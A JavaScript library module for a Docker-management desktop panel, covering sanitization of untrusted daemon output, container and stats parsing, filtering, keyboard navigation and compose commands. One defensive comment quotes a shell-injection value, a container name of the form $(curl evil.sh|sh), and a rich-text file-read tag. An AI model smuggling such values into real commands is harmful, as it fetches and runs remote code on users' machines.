.pragma library

// Pure data logic for Kaj. Nothing here touches QML, Quickshell, or the
// filesystem, so every function below is exercised by test/model.test.js under
// plain node. The rule this file exists to enforce: anything that comes back
// from the Docker daemon is untrusted input, and it gets normalized here once
// rather than being sprinkled through the UI.

// ---------------------------------------------------------------------------
// Untrusted text
// ---------------------------------------------------------------------------

// Container names, image tags, labels, and above all log lines are written by
// whoever built the image, not by the user running it. Two rules follow, and
// both are enforced here rather than left to each call site:
//
//   1. This text is never concatenated into a shell string. Service.qml runs
//      every command as an argv array, so a container literally named
//      $(curl evil.sh|sh) is just eleven boring characters.
//   2. This text is never handed to a rich-text renderer. QML's Text parses
//      HTML when textFormat is RichText, which turns an <img src="file://...">
//      in a log line into a local file read. The UI pins textFormat to
//      PlainText; sanitize() additionally strips the control bytes that would
//      otherwise let a log line repaint the panel.

// CSI sequences (ESC [ ... final), OSC strings (ESC ] ... BEL/ST), the short
// two-byte escapes, and the 8-bit CSI. Written with explicit hex escapes and
// never literal control bytes: a raw ESC or NUL in the source is invisible in
// a diff and makes grep treat the file as binary, which is exactly the wrong
// property for the code that sanitizes untrusted input.
var ansiPattern = /\x1b\[[0-9;?]*[ -\/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\x1b[@-Z\\-_]|\x9b[0-9;?]*[ -\/]*[@-~]/g
// C0 controls except tab and newline, plus DEL and the C1 range.
var controlPattern = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/g

function stripAnsi(text) {
  return String(text === undefined || text === null ? "" : text).replace(ansiPattern, "")
}

// Full cleanup for anything that will be shown to a human: drop escape
// sequences first, then any remaining control bytes, then cap the length so one
// pathological line cannot stall the renderer.
function sanitize(text, maxLength) {
  var limit = maxLength === undefined ? 4096 : maxLength
  var out = stripAnsi(text).replace(controlPattern, "")
  if (out.length > limit) out = out.slice(0, limit) + "…"
  return out
}

// Single-line variant, for names and status strings that must not wrap.
function sanitizeLine(text, maxLength) {
  return sanitize(String(text === undefined || text === null ? "" : text).replace(/[\r\n\t]+/g, " "), maxLength === undefined ? 256 : maxLength)
}

// ---------------------------------------------------------------------------
// Environment
// ---------------------------------------------------------------------------

// Every value is hidden until asked for. Kaj deliberately does not try to guess
// which keys are secret: any such rule is a list of the names someone thought
// of, and the one it misses is the one that leaks. DATABASE_URL, S3_ENDPOINT and
// a plain PORT can each carry something private, so the safe default is the same
// for all of them, and revealing is always a deliberate act.

// Only the first "=" separates; values routinely contain more.
function splitEnvEntry(entry) {
  var text = String(entry === undefined || entry === null ? "" : entry)
  var index = text.indexOf("=")
  if (index < 0) return { key: sanitizeLine(text), value: "" }
  return { key: sanitizeLine(text.slice(0, index)), value: sanitizeLine(text.slice(index + 1), 512) }
}

// A fixed-width mask: the real length is itself a hint about the value, so it
// is not reproduced. An unset value stays visibly empty, which is worth knowing
// and gives nothing away.
function maskValue(value) {
  return String(value === undefined || value === null ? "" : value) === "" ? "" : "••••••••"
}

function envEntries(list) {
  var out = []
  if (!list || list.length === undefined) return out
  for (var i = 0; i < list.length; i++) {
    var parts = splitEnvEntry(list[i])
    out.push({ key: parts.key, value: parts.value, masked: maskValue(parts.value) })
  }
  return out
}

// ---------------------------------------------------------------------------
// Parsing
// ---------------------------------------------------------------------------

// Docker emits one JSON object per line. A malformed line is skipped rather
// than failing the whole refresh: a single unparseable container should not
// blank the panel.
//
// Every line is stripped of escape sequences before parsing. This is not
// belt-and-braces: `docker stats` writes real cursor-control codes around each
// record even when its output is a pipe rather than a terminal, so a line
// arrives as ESC[H{"CPUPerc":...}ESC[K and JSON.parse rejects all of it. The
// same strip covers a log or event payload that carries escapes deliberately.
function parseJsonLines(text) {
  var out = []
  var lines = stripAnsi(String(text === undefined || text === null ? "" : text)).split("\n")
  for (var i = 0; i < lines.length; i++) {
    var line = lines[i].replace(controlPattern, "").trim()
    if (line === "") continue
    try {
      var parsed = JSON.parse(line)
      if (parsed && typeof parsed === "object") out.push(parsed)
    } catch (e) {
      // Ignore: partial line from a stream, or output we do not understand.
    }
  }
  return out
}

// Whole-document JSON, for commands that answer with one array rather than a
// record per line: `docker network inspect` and `docker system df -v`.
function parseJson(text) {
  var body = stripAnsi(String(text === undefined || text === null ? "" : text))
    .replace(controlPattern, "").trim()
  if (body === "") return []
  try {
    var parsed = JSON.parse(body)
    return Array.isArray(parsed) ? parsed : []
  } catch (e) {
    return []
  }
}

// Accept only what a Docker id can actually be. A daemon that answered with
// anything else is a daemon we do not pass to a command line.
function parseIds(text) {
  var out = []
  var lines = String(text === undefined || text === null ? "" : text).split("\n")
  for (var i = 0; i < lines.length; i++) {
    var line = lines[i].trim()
    if (/^[0-9a-f]{12,64}$/.test(line)) out.push(line)
  }
  return out
}

function shortId(id) {
  return String(id || "").replace(/^sha256:/, "").slice(0, 12)
}

// Docker reports container names with a leading slash.
function displayName(name) {
  return sanitizeLine(String(name || "").replace(/^\//, ""))
}

// Health is only meaningful when the image declares a healthcheck; absent one,
// "" means "no opinion" and must not be shown as unhealthy.
function healthOf(state) {
  if (!state || typeof state !== "object") return ""
  var health = state.Health
  if (!health || typeof health !== "object") return ""
  return sanitizeLine(health.Status || "")
}

// One container, normalized from the inspect payload into the flat shape the
// UI binds against.
function normalizeContainer(raw) {
  if (!raw || typeof raw !== "object") return null
  var state = raw.State && typeof raw.State === "object" ? raw.State : {}
  var labels = raw.Labels && typeof raw.Labels === "object" ? raw.Labels : {}
  var status = sanitizeLine(state.Status || "unknown")

  return {
    id: String(raw.Id || ""),
    shortId: shortId(raw.Id),
    name: displayName(raw.Name),
    image: sanitizeLine(raw.Image || ""),
    status: status,
    running: state.Running === true,
    paused: state.Paused === true,
    restarting: state.Restarting === true,
    dead: state.Dead === true,
    oomKilled: state.OOMKilled === true,
    exitCode: Number(state.ExitCode || 0),
    error: sanitizeLine(state.Error || "", 512),
    health: healthOf(state),
    restartCount: Number(raw.RestartCount || 0),
    startedAt: parseTime(state.StartedAt),
    finishedAt: parseTime(state.FinishedAt),
    createdAt: parseTime(raw.Created),
    project: sanitizeLine(labels["com.docker.compose.project"] || ""),
    service: sanitizeLine(labels["com.docker.compose.service"] || ""),
    ports: normalizePorts(raw.Ports),
    // Names only. The full Mounts and Networks objects carry host paths and
    // IPAM detail the panel never shows, and the volumes view only ever asks
    // "is this one of yours?".
    mounts: mountNames(raw.Mounts),
    networks: networkNames(raw.Networks),
    // 0 means "no limit set", which is also what Docker reports for a
    // container that simply inherits the host's memory. Keeping the raw 0
    // is what lets the UI tell "unlimited" from "limited to all of it".
    memoryLimit: positiveNumber(raw.MemoryLimit),
    cpuLimit: positiveNumber(raw.NanoCpus) / 1e9
  }
}

// A bind mount has no Name, only a host path: it is not a volume and must not
// make one look used.
function mountNames(list) {
  var out = []
  if (!list || list.length === undefined) return out
  for (var i = 0; i < list.length; i++) {
    var mount = list[i]
    if (!mount || mount.Type !== "volume") continue
    var name = sanitizeLine(mount.Name || "")
    if (name !== "" && out.indexOf(name) === -1) out.push(name)
  }
  return out
}

function networkNames(map) {
  var out = []
  if (!map || typeof map !== "object") return out
  for (var key in map) {
    var name = sanitizeLine(key)
    if (name !== "" && out.indexOf(name) === -1) out.push(name)
  }
  return out
}

function positiveNumber(value) {
  var n = Number(value)
  return isFinite(n) && n > 0 ? n : 0
}

function normalizeContainers(list) {
  var out = []
  if (!Array.isArray(list)) return out
  for (var i = 0; i < list.length; i++) {
    var item = normalizeContainer(list[i])
    if (item && item.id !== "") out.push(item)
  }
  return out
}

// Docker's zero timestamp means "never"; return 0 so callers can test falsily.
function parseTime(value) {
  var text = String(value || "")
  if (text === "" || text.indexOf("0001-01-01") === 0) return 0
  var ms = Date.parse(text)
  return isFinite(ms) ? ms : 0
}

// NetworkSettings.Ports maps "5800/tcp" to a list of host bindings, or to null
// for an exposed-but-unpublished port.
function normalizePorts(ports) {
  var out = []
  if (!ports || typeof ports !== "object") return out
  var keys = Object.keys(ports).sort()
  for (var i = 0; i < keys.length; i++) {
    var bindings = ports[keys[i]]
    var parts = String(keys[i]).split("/")
    var containerPort = parseInt(parts[0], 10)
    if (!isFinite(containerPort)) continue
    if (!Array.isArray(bindings) || bindings.length === 0) {
      out.push({ containerPort: containerPort, protocol: parts[1] || "tcp", hostIp: "", hostPort: 0, published: false })
      continue
    }
    // Collapse the v4/v6 pair Docker reports for a single -p flag.
    var seen = {}
    for (var j = 0; j < bindings.length; j++) {
      var hostPort = parseInt(bindings[j] && bindings[j].HostPort, 10)
      if (!isFinite(hostPort) || seen[hostPort]) continue
      seen[hostPort] = true
      out.push({
        containerPort: containerPort,
        protocol: parts[1] || "tcp",
        hostIp: sanitizeLine(bindings[j].HostIp || ""),
        hostPort: hostPort,
        published: true
      })
    }
  }
  return out
}

// Only a port actually bound on a loopback-reachable address is worth offering
// as a clickable link. 0.0.0.0 and :: are reachable via localhost; a binding to
// some other specific interface may not be, so it is shown but not linked.
function browsableUrl(port) {
  if (!port || !port.published || port.protocol !== "tcp") return ""
  var host = port.hostIp
  if (host !== "" && host !== "0.0.0.0" && host !== "::" && host !== "127.0.0.1" && host !== "localhost") return ""
  var scheme = port.hostPort === 443 || port.hostPort === 8443 ? "https" : "http"
  return scheme + "://localhost:" + port.hostPort
}

// The ports worth putting in a row: published, and reachable from this machine.
// An exposed-but-unpublished port has nothing to click, and a port bound to one
// specific remote interface is not reachable via localhost, so neither earns
// space in a bar popup.
function linkablePorts(container) {
  var out = []
  if (!container) return out
  // Deliberately not Array.isArray: this array is nested inside a container
  // object that has been stored in a QML `var` property, and QML hands such
  // arrays back as a list type that indexes and reports length exactly like an
  // array while failing Array.isArray. The top-level helpers get away with the
  // stricter check because they receive arrays built moments earlier in the
  // same JS context; anything reached *through* a QML-held object cannot.
  var ports = container.ports
  if (!ports || ports.length === undefined) return out
  var seen = {}
  for (var i = 0; i < ports.length; i++) {
    var url = browsableUrl(ports[i])
    if (url === "" || seen[url]) continue
    seen[url] = true
    out.push({ port: ports[i].hostPort, url: url })
  }
  return out
}

// ---------------------------------------------------------------------------
// Stats
// ---------------------------------------------------------------------------

// `docker stats` reports preformatted strings ("3.49%", "74.71MiB / 7.628GiB").
// Parse to numbers so the UI can sort and draw meters instead of printing them.
function parsePercent(value) {
  var n = parseFloat(String(value || "").replace("%", ""))
  return isFinite(n) && n >= 0 ? n : 0
}

var unitFactors = { B: 1, KB: 1e3, MB: 1e6, GB: 1e9, TB: 1e12, KIB: 1024, MIB: 1048576, GIB: 1073741824, TIB: 1099511627776 }

function parseSize(value) {
  var match = String(value || "").trim().match(/^([0-9.]+)\s*([A-Za-z]+)?$/)
  if (!match) return 0
  var n = parseFloat(match[1])
  if (!isFinite(n)) return 0
  var factor = unitFactors[String(match[2] || "B").toUpperCase()]
  return factor ? n * factor : 0
}

// "74.71MiB / 7.628GiB" -> { used, limit }
function parseUsagePair(value) {
  var parts = String(value || "").split("/")
  return { used: parseSize(parts[0]), limit: parseSize(parts[1]) }
}

function normalizeStat(raw) {
  if (!raw || typeof raw !== "object") return null
  var id = String(raw.ID || raw.Container || "")
  if (id === "") return null
  var mem = parseUsagePair(raw.MemUsage)
  return {
    shortId: shortId(id),
    cpu: parsePercent(raw.CPUPerc),
    memPercent: parsePercent(raw.MemPerc),
    memUsed: mem.used,
    memLimit: mem.limit,
    pids: parseInt(raw.PIDs, 10) || 0
  }
}

// Usage against the container's own limit, or -1 when it has none. An
// unlimited container is not "using 3% of memory" in any useful sense: the
// number it would be measured against is the whole host, which says nothing
// about whether this container is close to trouble.
function memoryPressure(container, stats) {
  if (!container || !stats) return -1
  var limit = Number(container.memoryLimit || 0)
  if (!isFinite(limit) || limit <= 0) return -1
  var used = Number(stats.memUsed || 0)
  if (!isFinite(used) || used < 0) return -1
  return used / limit
}

// The threshold a figure turns urgent at. Not a cliff — a container can sit
// at 95% happily — but it is the point where trouble stops being surprising.
var pressureWarning = 0.9

// The same question for CPU, and the reason it is answerable at all: without
// a limit, `docker stats` reports a percentage of every core on the host, so
// 150% is either half of the machine or the whole of this container's ration
// depending on a number the stats stream never mentions.
function cpuPressure(container, stats) {
  if (!container || !stats) return -1
  var cpus = Number(container.cpuLimit || 0)
  if (!isFinite(cpus) || cpus <= 0) return -1
  var cpu = Number(stats.cpu || 0)
  if (!isFinite(cpu) || cpu < 0) return -1
  return cpu / (cpus * 100)
}

// Stats arrive as a stream keyed by short id; fold them into a lookup the UI
// can index by container.
function mergeStats(existing, raw) {
  var out = {}
  if (existing && typeof existing === "object") {
    var keys = Object.keys(existing)
    for (var i = 0; i < keys.length; i++) out[keys[i]] = existing[keys[i]]
  }
  var stat = normalizeStat(raw)
  if (stat) out[stat.shortId] = stat
  return out
}

// ---------------------------------------------------------------------------
// Grouping and rollup
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

// A container disappearing mid-refresh is normal, not an error worth showing.
// The snapshot is two commands — list the ids, then inspect them — so anything
// removed in between is reported by the second as "No such container". That is
// a race the design accepts in exchange for never needing a shell, and the
// panel should absorb it silently rather than blaming the user for it.
function isMissingContainerError(line) {
  return /No such (container|object)/i.test(String(line || ""))
}

// Docker reports one line per failure, so removing a dozen containers yields a
// dozen near-identical lines. Show the first thing that actually matters, and
// only that: a wall of concatenated messages is read as noise and ignored.
function firstRealError(text, maxLength) {
  var lines = String(text === undefined || text === null ? "" : text).split("\n")
  for (var i = 0; i < lines.length; i++) {
    var line = lines[i].trim()
    if (line === "") continue
    if (isMissingContainerError(line)) continue
    return sanitizeLine(line, maxLength === undefined ? 200 : maxLength)
  }
  return ""
}

// ---------------------------------------------------------------------------
// Search and status filtering
// ---------------------------------------------------------------------------

var statusFilters = ["all", "running", "stopped", "problems"]

function statusFilterLabel(filter) {
  if (filter === "running") return "Running"
  if (filter === "stopped") return "Stopped"
  if (filter === "problems") return "Problems"
  return "All"
}

function matchesStatus(container, filter) {
  if (!container) return false
  if (filter === "running") return container.running === true
  if (filter === "stopped") return container.running !== true
  // "Problems" is the filter nothing else offers and the one most worth
  // having: everything a person would want to act on right now, in one click.
  if (filter === "problems") return containerSeverity(container) !== "ok"
  return true
}

// Substring rather than fuzzy. Container names are short identifiers people
// type exactly; a fuzzy match on "db" would drag in every container with a d
// and a b in it and feel broken.
function matchesQuery(container, query) {
  if (!container) return false
  var needle = String(query === undefined || query === null ? "" : query).trim().toLowerCase()
  if (needle === "") return true
  var haystacks = [container.name, container.service, container.project, container.image, container.shortId]
  for (var i = 0; i < haystacks.length; i++) {
    if (String(haystacks[i] || "").toLowerCase().indexOf(needle) !== -1) return true
  }
  return false
}

function filterContainers(containers, query, statusFilter) {
  var list = Array.isArray(containers) ? containers : []
  var out = []
  for (var i = 0; i < list.length; i++) {
    if (matchesStatus(list[i], statusFilter) && matchesQuery(list[i], query)) out.push(list[i])
  }
  return out
}

// Chip counts come from the same list the chips filter, so the numbers always
// add up to what clicking them will show. Counted before the text query is
// applied: a chip that reads "Running 8" while a search is narrowing the list
// would be lying about what its own click produces, so the query is included.
function statusCounts(containers, query) {
  var list = Array.isArray(containers) ? containers : []
  var counts = { all: 0, running: 0, stopped: 0, problems: 0 }
  for (var i = 0; i < list.length; i++) {
    if (!matchesQuery(list[i], query)) continue
    counts.all++
    if (matchesStatus(list[i], "running")) counts.running++
    if (matchesStatus(list[i], "stopped")) counts.stopped++
    if (matchesStatus(list[i], "problems")) counts.problems++
  }
  return counts
}

// ---------------------------------------------------------------------------
// Keyboard cursor
// ---------------------------------------------------------------------------

// The panel renders grouped, but the keyboard moves through one flat sequence:
// j from the last container of one project lands on the first of the next.
// Groups are a visual convenience, not a navigation boundary.
function flattenGroups(groups) {
  var out = []
  var list = Array.isArray(groups) ? groups : []
  for (var i = 0; i < list.length; i++) {
    var containers = list[i] && Array.isArray(list[i].containers) ? list[i].containers : []
    for (var j = 0; j < containers.length; j++) out.push(containers[j])
  }
  return out
}

// Identity of a rendered list: which containers, in which order. The panel
// rebuilds its rows only when this changes, never merely because a container's
// data did. A Repeater destroys and recreates every delegate when its model is
// replaced, and each row rebuilt that way loses its hover — so with one
// restart-looping container emitting an event every couple of seconds, every
// tooltip in the panel flickered. Row data reaches the rows through bindings
// instead, which update in place.
function groupsKey(groups) {
  var parts = []
  var list = Array.isArray(groups) ? groups : []
  for (var i = 0; i < list.length; i++) {
    parts.push(list[i].project)
    var containers = list[i].containers || []
    for (var j = 0; j < containers.length; j++) parts.push(containers[j].id)
  }
  return parts.join("\u0000")
}

// Header numbers for one project, read live from the full container list so a
// stable row list does not leave the counts stale.
function groupStats(containers, project) {
  var list = Array.isArray(containers) ? containers : []
  var mine = []
  for (var i = 0; i < list.length; i++) {
    if ((list[i].project || "") === project) mine.push(list[i])
  }
  return { running: countRunning(mine), total: mine.length, severity: rollupSeverity(mine) }
}

// Clamps rather than wraps. Wrapping a short list makes j feel like it did
// nothing; stopping at the end says "that is all of them".
// Where a scroll lands. Kept here rather than inline in the panel for the
// same reason the cursor is: it is arithmetic with edges, and edges are what
// gets it wrong.
function scrollTarget(contentY, delta, step, contentHeight, viewportHeight) {
  var max = Math.max(0, Number(contentHeight || 0) - Number(viewportHeight || 0))
  var next = Number(contentY || 0) + Number(delta || 0) * Number(step || 0)
  if (!isFinite(next)) return 0
  return Math.max(0, Math.min(max, next))
}

// Wraps. A list long enough to need the cursor is long enough that walking
// back to the other end is the slow way round, and there is no ambiguity about
// what the ends mean here: the list is the whole content, not a window onto it.
function moveCursor(index, delta, length) {
  if (length <= 0) return -1
  if (index < 0) return delta > 0 ? 0 : length - 1
  var next = (index + delta) % length
  return next < 0 ? next + length : next
}

// Keeps the cursor pointing at the same container across a refresh. Without
// this, an event that rebuilds the list while you are three rows down snaps
// the selection back to the top mid-keystroke.
function cursorIndexForId(list, id, fallbackIndex) {
  var items = Array.isArray(list) ? list : []
  if (items.length === 0) return -1
  if (id) {
    for (var i = 0; i < items.length; i++) {
      if (items[i].id === id) return i
    }
  }
  if (fallbackIndex === undefined || fallbackIndex < 0) return -1
  return Math.max(0, Math.min(items.length - 1, fallbackIndex))
}

// The key bound to each action. Tooltips and the help sheet both read this, so
// a rebind cannot leave one of them advertising a key that no longer works.
// start and stop share Enter because they are one intent: flip this container.
function actionHotkey(action) {
  switch (action) {
    case "start":
    case "stop": return "Enter"
    case "restart": return "r"
    case "logs": return "o"
    case "shell": return "s"
    case "pause":
    case "unpause": return "p"
    case "remove": return "x"
    default: return ""
  }
}

// Every binding the panel answers to, in the order it is worth learning them.
var keyHelp = [
  { keys: "h  l", what: "Switch view" },
  { keys: "j  k", what: "Move between containers, or scroll" },
  { keys: "f", what: "Cycle status filter" },
  { keys: "Enter", what: "Start or stop" },
  { keys: "r", what: "Restart" },
  { keys: "o", what: "Logs in a terminal" },
  { keys: "s", what: "Shell in the container" },
  { keys: "p", what: "Pause or resume" },
  { keys: "x", what: "Remove (asks first)" },
  { keys: "e", what: "Environment variables" },
  { keys: "Ctrl+F  /", what: "Search" },
  { keys: "?", what: "This list" },
  { keys: "Esc", what: "Clear search, then close" }
]

// Present tense, because it is shown while the action is still running. A row
// mid-action must say what is happening to it: `docker stop` can take ten
// seconds to escalate from SIGTERM to SIGKILL, and a row that only greys out
// for that long is indistinguishable from one that is broken.
function busyLabel(action) {
  switch (action) {
    case "start": return "Starting…"
    case "stop": return "Stopping…"
    case "restart": return "Restarting…"
    case "pause": return "Pausing…"
    case "unpause": return "Resuming…"
    case "remove":
    case "removeVolumes": return "Removing…"
    default: return "Working…"
  }
}

// Why a key did nothing, phrased as the thing to do about it. Returning "" means
// the action is available and the caller should just run it. Silence is the
// wrong answer for a keystroke: the user cannot tell a no-op from a broken bind.
function unavailableReason(action, container, readOnly) {
  if (!container) return "Select a container first"
  // Read-only comes first, and the ordering is the whole point: a running
  // container told you to stop it before removing it, which is advice that
  // does not work — stopping is refused too. The reason has to be the one
  // that is actually in the way.
  if (readOnly === true && action !== "logs") return "Read-only mode is on"
  if (availableActions(container).indexOf(action) !== -1) return ""
  if (action === "remove") {
    if (container.running) return "Stop " + container.name + " before removing it"
    return "Cannot remove " + container.name
  }
  if (action === "shell" && !container.running) return container.name + " is not running"
  if (action === "restart" && !container.running) return "Start " + container.name + " instead"
  return "Not available for " + container.name
}

// The action Enter runs on the cursor row. Start and stop are the same key
// because they are the same intent — "flip this container" — and needing to
// know which one applies before pressing a key defeats the point.
function primaryAction(container) {
  if (!container) return ""
  if (container.paused) return "unpause"
  return container.running ? "stop" : "start"
}

// Which keystrokes open search. "/" is the plain character; Ctrl+F arrives as
// the ASCII control code for F (0x06), because that is what Qt puts in
// event.text and PanelKeyCatcher forwards event.text verbatim.
//
// Neither of the tidier routes works here. A QtQuick Shortcut never fires:
// Qt only delivers shortcuts to an active window, and a Quickshell layer-shell
// surface is never "active" in that sense — which is why nothing in the whole
// Omarchy shell uses one. Handling it on a parent item does not work either,
// because a QML KeyEvent arrives already accepted, so PanelKeyCatcher swallows
// every key it does not recognise instead of letting it bubble.
function isSearchKey(text) {
  if (text === "/") return true
  return String(text === undefined || text === null ? "" : text).charCodeAt(0) === 6
}

// What a key means, regardless of whether it can run right now. Kept separate
// from availability so the caller can tell "that key does nothing" apart from
// "that key means something you cannot do yet" — the first deserves silence,
// the second deserves an explanation. h/j/k/l and x are consumed by
// PanelKeyCatcher before Kaj sees them, so they are absent here by necessity.
function intendedAction(key, container) {
  if (key === "r") return "restart"
  if (key === "o") return "logs"
  if (key === "s") return "shell"
  if (key === "p") return container && container.paused ? "unpause" : "pause"
  return ""
}

// The action a key should actually run, or "" if the container does not
// support it. Kept so a caller that only wants the runnable verb has one.
function actionForKey(key, container) {
  if (!container) return ""
  var action = intendedAction(key, container)
  if (action === "") return ""
  return availableActions(container).indexOf(action) === -1 ? "" : action
}

// Compose grouping is the organizing idea of the panel: people think in
// projects ("my app"), not in a flat list of eleven containers. Standalone
// containers collect under an empty project id and render last.
function groupByProject(containers) {
  var order = []
  var groups = {}
  var list = Array.isArray(containers) ? containers : []

  for (var i = 0; i < list.length; i++) {
    var key = list[i].project || ""
    if (!groups[key]) {
      groups[key] = { project: key, standalone: key === "", containers: [] }
      order.push(key)
    }
    groups[key].containers.push(list[i])
  }

  order.sort(function (a, b) {
    if (a === "") return 1
    if (b === "") return -1
    return a.localeCompare(b)
  })

  var out = []
  for (var j = 0; j < order.length; j++) {
    var group = groups[order[j]]
    group.containers.sort(compareContainers)
    group.running = countRunning(group.containers)
    group.total = group.containers.length
    group.severity = rollupSeverity(group.containers)
    out.push(group)
  }
  return out
}

// Running first, then by compose service name so a project's containers keep a
// stable order across refreshes rather than shuffling on every event.
function compareContainers(a, b) {
  if (a.running !== b.running) return a.running ? -1 : 1
  var left = a.service || a.name
  var right = b.service || b.name
  return left.localeCompare(right)
}

function countRunning(containers) {
  var n = 0
  var list = Array.isArray(containers) ? containers : []
  for (var i = 0; i < list.length; i++) if (list[i].running) n++
  return n
}

// Severity drives the bar icon colour. "error" is reserved for states a person
// would want to know about immediately without opening anything.
function containerSeverity(container) {
  if (!container) return "ok"
  if (container.oomKilled) return "error"
  if (container.dead) return "error"
  if (container.health === "unhealthy") return "error"
  if (!container.running && container.exitCode !== 0) return "error"
  if (container.restarting) return "warn"
  if (container.paused) return "warn"
  if (container.health === "starting") return "warn"
  return "ok"
}

// A glyph replaces the status dot where the shape itself carries the meaning.
// Paused is the case that most needs it: a paused container is still "up", so a
// coloured dot reads as running and the distinction is lost. "" means the dot.
function statusGlyph(container) {
  if (!container) return ""
  if (container.paused) return "󰏤"
  return ""
}

var severityRank = { ok: 0, warn: 1, error: 2 }

function rollupSeverity(containers) {
  var worst = "ok"
  var list = Array.isArray(containers) ? containers : []
  for (var i = 0; i < list.length; i++) {
    var severity = containerSeverity(list[i])
    if (severityRank[severity] > severityRank[worst]) worst = severity
  }
  return worst
}

// ---------------------------------------------------------------------------
// Compose
// ---------------------------------------------------------------------------

// Group actions go through `docker compose`, not through a loop over the
// containers Kaj happens to know about. Compose owns concepts the container
// list cannot see — networks, dependency order, which services belong to the
// project at all — and reimplementing it by fanning out `docker stop` would
// quietly diverge from what `docker compose stop` does in the same directory.
//
// `-p <project>` is enough for these four: Compose v2 finds an existing
// project's containers by label, so they work from any working directory
// without the compose file. `up` deliberately is not here — it needs the
// config file, which Kaj cannot depend on still being where it was.
var composeVerbs = ["start", "stop", "restart", "down"]

function composeCommand(project, verb) {
  if (!project || project === "") return null
  if (composeVerbs.indexOf(verb) === -1) return null
  return ["docker", "compose", "--project-name", project, verb]
}

function composeBusyLabel(verb) {
  if (verb === "down") return "Removing project…"
  return busyLabel(verb)
}

// down removes containers and the project network, so it is confirmed like any
// other destructive verb, and the prompt says what goes beyond the containers.
function composeConfirmText(project, running, total) {
  return "Run docker compose down on " + project + "? "
    + total + (total === 1 ? " container" : " containers")
    + " and the project network are removed. Named volumes are kept."
}

// ---------------------------------------------------------------------------
// Views
// ---------------------------------------------------------------------------

var views = ["containers", "images", "volumes", "networks", "disk"]

function viewLabel(view) {
  if (view === "images") return "Images"
  if (view === "volumes") return "Volumes"
  if (view === "networks") return "Networks"
  if (view === "disk") return "Disk"
  return "Containers"
}

// ---------------------------------------------------------------------------
// Volumes and networks
// ---------------------------------------------------------------------------

// `docker system df` and `docker volume ls` report labels as one flat string,
// "a=1,b=2", unlike inspect, which returns an object. A label value containing
// a comma is therefore ambiguous and cannot be recovered — Docker loses that
// information before Kaj sees it. Only the Compose project name is read here,
// and Compose does not put commas in it.
function parseLabelString(value) {
  var out = {}
  var text = String(value === undefined || value === null ? "" : value)
  if (text === "") return out
  var parts = text.split(",")
  for (var i = 0; i < parts.length; i++) {
    var eq = parts[i].indexOf("=")
    if (eq > 0) out[parts[i].slice(0, eq)] = parts[i].slice(eq + 1)
  }
  return out
}

function normalizeVolume(raw) {
  if (!raw || typeof raw !== "object") return null
  var name = sanitizeLine(raw.Name || "")
  if (name === "") return null
  var labels = parseLabelString(raw.Labels)
  return {
    name: name,
    size: parseSize(raw.Size),
    driver: sanitizeLine(raw.Driver || ""),
    mountpoint: sanitizeLine(raw.Mountpoint || ""),
    project: sanitizeLine(labels["com.docker.compose.project"] || "")
  }
}

function normalizeVolumes(list) {
  var out = []
  if (!Array.isArray(list)) return out
  for (var i = 0; i < list.length; i++) {
    var volume = normalizeVolume(list[i])
    if (volume) out.push(volume)
  }
  out.sort(function (a, b) { return b.size - a.size || a.name.localeCompare(b.name) })
  return out
}

// The three networks every daemon has. They cannot be removed and are not
// interesting to look at, so they are named rather than treated as findings.
var builtinNetworks = ["bridge", "host", "none"]

function isBuiltinNetwork(name) {
  return builtinNetworks.indexOf(String(name || "")) !== -1
}

function normalizeNetwork(raw) {
  if (!raw || typeof raw !== "object") return null
  var name = sanitizeLine(raw.Name || "")
  if (name === "") return null
  var labels = raw.Labels && typeof raw.Labels === "object" ? raw.Labels : {}
  return {
    id: String(raw.Id || ""),
    name: name,
    driver: sanitizeLine(raw.Driver || ""),
    scope: sanitizeLine(raw.Scope || ""),
    internal: raw.Internal === true,
    builtin: isBuiltinNetwork(name),
    subnet: firstSubnet(raw.IPAM),
    project: sanitizeLine(labels["com.docker.compose.project"] || "")
  }
}

function firstSubnet(ipam) {
  if (!ipam || typeof ipam !== "object") return ""
  var config = ipam.Config
  if (!config || config.length === undefined) return ""
  for (var i = 0; i < config.length; i++) {
    if (config[i] && config[i].Subnet) return sanitizeLine(config[i].Subnet)
  }
  return ""
}

function normalizeNetworks(list) {
  var out = []
  if (!Array.isArray(list)) return out
  for (var i = 0; i < list.length; i++) {
    var network = normalizeNetwork(list[i])
    if (network) out.push(network)
  }
  // Built-in networks last: they are always present and never actionable.
  out.sort(function (a, b) {
    if (a.builtin !== b.builtin) return a.builtin ? 1 : -1
    return a.name.localeCompare(b.name)
  })
  return out
}

// Usage is derived from the containers Kaj already streams rather than from a
// second command. `docker volume ls` cannot say what is using a volume, and
// `docker system df -v` only counts — but more importantly, a separate command
// is a snapshot: this way a volume stops being unused the moment a container
// starts, on the same event that redraws the container list.
function containerVolumeNames(container) {
  var out = []
  if (!container) return out
  var mounts = container.mounts
  if (!mounts || mounts.length === undefined) return out
  for (var i = 0; i < mounts.length; i++) {
    var name = String(mounts[i] || "")
    if (name !== "" && out.indexOf(name) === -1) out.push(name)
  }
  return out
}

function usersOf(containers, name, pick) {
  var out = []
  if (!containers || containers.length === undefined || !name) return out
  for (var i = 0; i < containers.length; i++) {
    var names = pick(containers[i])
    if (names.indexOf(name) !== -1) out.push(containers[i].name)
  }
  return out
}

function volumeUsers(containers, volumeName) {
  return usersOf(containers, volumeName, containerVolumeNames)
}

// Only running containers. A stopped container keeps its network in its
// config, but its endpoint is gone: Docker will remove the network out from
// under it without complaint, so calling it a member would be a lie. Volumes
// are the opposite case — `docker volume rm` refuses while any container
// references one, running or not — so volumeUsers counts them all.
function networkMembers(containers, networkName) {
  return usersOf(containers, networkName, function (container) {
    if (!container || container.running !== true) return []
    return container.networks && container.networks.length !== undefined
      ? container.networks : []
  })
}

// "unused", or the containers using it, capped so one popular network cannot
// push everything else off the row.
function usageLabel(users) {
  if (!users || users.length === 0) return "unused"
  if (users.length <= 3) return users.join(", ")
  return users.slice(0, 3).join(", ") + " +" + (users.length - 3)
}

function filterByName(list, query) {
  var needle = String(query || "").trim().toLowerCase()
  if (!list || list.length === undefined) return []
  if (needle === "") return list
  var out = []
  for (var i = 0; i < list.length; i++) {
    var item = list[i]
    var haystack = (item.name + " " + (item.project || "") + " " + (item.driver || "")).toLowerCase()
    if (haystack.indexOf(needle) !== -1) out.push(item)
  }
  return out
}

// ---------------------------------------------------------------------------
// Images and disk
// ---------------------------------------------------------------------------

